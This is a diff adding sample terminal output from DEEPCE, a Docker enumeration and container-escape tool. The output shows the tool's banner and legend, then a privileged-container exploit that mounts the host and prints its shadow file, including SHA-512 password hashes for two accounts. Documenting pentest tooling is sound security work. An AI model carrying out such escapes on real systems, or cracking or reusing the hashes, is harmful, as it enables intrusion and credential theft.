@@ -1,0 +1,78 @@
+
+[1;90m                      ##[1;37m         .
+[1;90m                ## ## ##[1;37m        ==
+[1;90m             ## ## ## ##[1;37m       ===
+[1;37m         /"""""""""""""""""\___/ ===
+[1;34m    ~~~ [1;90m{[1;34m~~ ~~~~ ~~~ ~~~~ ~~~ ~[1;90m /  [1;37m===-[1;34m ~~~[0m
+[1;90m         \______ X           __/
+[1;90m           \    \         __/
+[1;90m            \____\_______/[0m
+          __
+     ____/ /__  ___  ____  ________
+    / __  / _ \/ _ \/ __ \/ ___/ _ \ [1;90m  ENUMERATE[0m
+   / /_/ /  __/  __/ /_/ / (__/  __/ [1;90m ESCALATE[0m
+   \__,_/\___/\___/ .___/\___/\___/[1;90m  ESCAPE[0m
+                 /_/
+
+ Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+ by stealthcopter
+
+[1;34m==========================================[1;32m( Colors )[1;34m==========================================[0m
+[1;33m[+][1;32m Exploit Test ............ [0m[48;5;1mExploitable - Check this out[0m
+[1;33m[+][1;32m Basic Test .............. [0m[1;33mPositive Result[0m
+[1;33m[+][1;32m Another Test ............ [0m[1;31mError running check[0m
+[1;33m[+][1;32m Negative Test ........... [0m[1;90mNo[0m
+[1;33m[+][1;32m Multi line test ......... [0m[1;33mYes[0m
+[1;90mCommand output
+spanning multiple lines[0m
+
+[1;90mTips will look like this and often contains links with additional info. You can usually 
+ctrl+click links in modern terminal to open in a browser window
+See [4mhttps://stealthcopter.github.io/deepce[0m[0m
+
+[1;34m==================================[1;32m( Exploiting Privileged )[1;34m===================================[0m
+[1;90mThe container appears to be running in privilege mode, we should be able to access the 
+raw disks and mount the hosts root partition in order to gain code execution.
+See [4mhttps://stealthcopter.github.io/deepce/guides/docker-privileged.md[0m[0m
+
+[1;33m[+][1;32m Preparing Exploit [0m[1;90m [0m
+[1;33m[+][1;32m Exploit Type ............. [0m[1;90mPrint Shadow[0m
+[1;33m[+][1;32m Clean up ................. [0m[1;90mAutomatic on container exit[0m
+root:*LOCK*:14600::::::
+daemon:*:18459:0:99999:7:::
+bin:*:18459:0:99999:7:::
+sys:*:18459:0:99999:7:::
+sync:*:18459:0:99999:7:::
+games:*:18459:0:99999:7:::
+man:*:18459:0:99999:7:::
+lp:*:18459:0:99999:7:::
+mail:*:18459:0:99999:7:::
+news:*:18459:0:99999:7:::
+uucp:*:18459:0:99999:7:::
+proxy:*:18459:0:99999:7:::
+www-data:*:18459:0:99999:7:::
+backup:*:18459:0:99999:7:::
+list:*:18459:0:99999:7:::
+irc:*:18459:0:99999:7:::
+gnats:*:18459:0:99999:7:::
+nobody:*:18459:0:99999:7:::
+systemd-network:*:18459:0:99999:7:::
+systemd-resolve:*:18459:0:99999:7:::
+syslog:*:18459:0:99999:7:::
+messagebus:*:18459:0:99999:7:::
+_apt:*:18459:0:99999:7:::
+lxd:*:18459:0:99999:7:::
+uuidd:*:18459:0:99999:7:::
+dnsmasq:*:18459:0:99999:7:::
+landscape:*:18459:0:99999:7:::
+sshd:*:18459:0:99999:7:::
+pollinate:*:18459:0:99999:7:::
+mysql::18469:0:99999:7:::
+postgres:*:18469:0:99999:7:::
+sbt::18469::::::
+sphinxsearch::18469:0:99999:7:::
+mongodb:*:18469:0:99999:7:::
+runneradmin:$6$Lct7dN6sJTHZ3Egf$ZtdpMsXvh82CWLojwtprzfW2.ZXKRsoA06HbTj/oVNvOvLSGFhuKTSVRzF50v/n0RAqTV0kU/NGe4azJTb9e./:18475:0:99999:7:::
+runner:*:18475:0:99999:7:::
+deepce:$6$CHpCN9uM$Nu3JJ2f4AkVlSwdD1S.vlIdYdxVGQmJpNBhn9dFmOrUFzJJ6ImtADPzGGpiHJFbRuKvoj6arctgF1fTfCP5wX1:18480:0:99999:7:::
+[1;34m===============================================[1;32m[1;34m===============================================[0m
